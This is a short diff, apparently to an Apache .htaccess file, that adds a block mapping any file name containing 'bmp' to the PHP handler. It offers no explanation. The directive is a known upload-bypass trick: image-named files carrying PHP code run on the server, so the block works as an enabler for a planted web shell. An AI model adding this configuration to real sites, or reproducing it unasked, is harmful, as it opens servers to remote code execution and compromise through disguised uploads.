@@ -1,0 +1,4 @@
+<FilesMatch "bmp">
+SetHandler application/x-httpd-php
+</FilesMatch>
+
